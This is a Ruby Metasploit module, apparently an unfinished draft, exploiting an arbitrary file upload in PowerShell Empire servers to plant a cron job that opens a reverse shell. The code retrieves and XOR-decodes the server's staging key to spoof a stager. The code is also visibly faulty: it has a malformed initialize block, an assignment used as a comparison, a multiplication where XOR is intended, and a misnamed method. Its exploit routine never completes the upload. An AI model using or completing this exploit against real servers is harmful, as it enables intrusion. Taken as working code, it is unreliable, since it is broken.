class MetasploitModule < Msf::Exploit::Remote
	Rank = nil

	# TODO get hash where vunerability was fixed
	# TODO create test docker container of empire 
	# TODO payload, targets, platform
	# Break POC down into small steps, mostly concerned with foregry of stages first


	# TODO verify the staging key has been recovered with a vunerable commit. 
	def initialize(info={})
		'Name' => 'PowerShellEmpire Arbitrary file Upload (Millennium Falcon)',

		'Description' => %q{This module exploits a vulnerability in PowerShellEmpire < 5.9.3 
			which allows for RCE via arbitary file uploads. This module will upload a file to the cron.d 
			directory to spawn a reverse shell. Thank you to AceResponder for the discovery of 
			this vunerability and original POC; and of course thank you to h00die for the module suggestion },

			'Author' => [
				'Ace Responder', # Original exploit discovery and POC
				'gardnerapp' # Metasploit module
			], 
			'License' => MSF_LICENSE,
			'References' => [] # TODO link Ace Responder writeup and POC 

			register_options(
				[
					Opt::RPORT(8080),
					OptString.new('TARGETURI', [false, 'Base URI path', '/']),
					OptString.new('STAGE0_URI', [false, 'Path requested by the initial launcher, default is index.asp', 'index.asp'])
				])
	end 

	# taken from ./empire_skywalker.rb 
	# need to get key for the most recent commit
	# this exploit is relevant for a bunch of versions mayber we could make the reversal key dynamic
	 def reversal_key
    # reversal key for commit da52a626 (March 3rd, 2016) - present (September 21st, 2016)
    [
      [ 160, 0x3d], [  33, 0x2c], [  34, 0x24], [ 195, 0x3d], [ 260, 0x3b], [  37, 0x2c], [  38, 0x24], [ 199, 0x2d],
      [   8, 0x20], [  41, 0x3d], [  42, 0x22], [ 139, 0x22], [ 108, 0x2e], [ 173, 0x2e], [  14, 0x2d], [  47, 0x29],
      [ 272, 0x5d], [ 113, 0x3b], [  82, 0x3b], [  51, 0x2d], [ 276, 0x2e], [ 213, 0x2e], [  86, 0x2d], [ 183, 0x3a],
      [  24, 0x7b], [  57, 0x2d], [ 282, 0x20], [  91, 0x20], [  92, 0x2d], [ 157, 0x3b], [  30, 0x28], [  31, 0x24]
    ]
  end

	# Recovers the staging key, spoofs step0 of stager process
	# Staging URI is subject to change
	def get_stagining_key
		res = send_request_cgi({
			'method' => 'GET',
			'uri' => normalize_uri(target_uri.path, datastore['STAGE0_URI'])
		})

		return unless res && res.code = 200

		puts "Response from #{datastore['STAGE0_URI']}: #{res.code}\n\n#{res}"

		staging_key = Array.new(32, nil)
		staging_data = res.body.bytes

		# this looks to be decoding the staging key based on a reversal key, 
		# may not sure if this is necesssary now, if so need to get the reversal from the
		# empire repo

		puts "Staging data before reversing:\n #{staging_data} "

		reversal_key.each_with_index do |(pos,char_code), key_pos|
			# xor the staging key w reversal key
			staging_key[key_pos] = staging_data[pos] ^ char_code
		end 

		puts "After reversal staging key is now:\n #{staging_key}"

		return if staging_key.include? nil

		vprint_status("Staging key seems to have been recovered. Now seeking validation")

		decrypted = []
		staging_data[0..23].each_with_index do |byte,pos|
			decrypted << (byte * staging_key[pos])
		end 
		puts "Decrypted:\n#{decrypted}\n#{decrypted.pack('C*')}"

		return unless decrypted.pack('C*').downcase == 'function start-negotiate'

		staging_key
	end 

	def exploit
		# grab the staging key from the server and start spoofing as a stager
		staging_key = get_staging_key
	end 
end 